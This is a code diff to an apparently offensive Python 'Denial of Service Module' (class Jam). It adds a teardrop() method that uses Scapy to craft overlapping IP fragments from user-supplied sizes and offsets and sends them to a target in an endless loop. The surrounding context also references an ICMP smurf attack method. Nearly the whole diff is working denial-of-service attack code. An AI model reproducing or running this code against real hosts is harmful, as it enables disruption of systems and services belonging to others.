@@ -29,7 +29,7 @@ class Jam(object):
 
 	name = "Denial of Service Module."
 	desc = "Denial of service attacks here."
-	version = "0.8"
+	version = "0.9"
 	ps = "Need to add POST DoS attack."
 
 	def __init__(self):
@@ -141,6 +141,39 @@ class Jam(object):
 		except Exception as e:
 			print "[!] Error: {}".format(e)
 
+
+
+	def teardrop(self,target):
+			#First packet
+		try:
+			size = input("[+] First fragment packet size: ")
+			offset= input("[+] First fragment packet offset: ")
+		except Exception as e:
+			print "[!] Error: {}".format(e)
+			return
+
+		load1="\x00"*size
+		IP_one = IP(dst = target, flags="MF", proto=17, frag = offset)
+
+			#Second packet
+		try:
+			size= input("[+] Second fragment packet size: ")
+			offset= input("[+] Second fragment packet offset: ")
+		except Exception as e:
+			print "[!] Error: {}".format(e)
+			return
+
+		load2="\x00"*size
+		IP_two = IP(dst = target, flags=0, proto=17, frag=offset)
+
+                print "[+] Teardrop UDP fragmentation denial of service initialized."
+		while True:
+			try:
+				send(IP_one/load1,verbose=False)
+				send(IP_two/load2,verbose=False)
+			except KeyboardInterrupt:
+		                print "[-] Teardrop UDP fragmentation denial of service finalized."
+				break
 
 	def icmpsmurfstart(self, tgt):
 		self.tgt = tgt
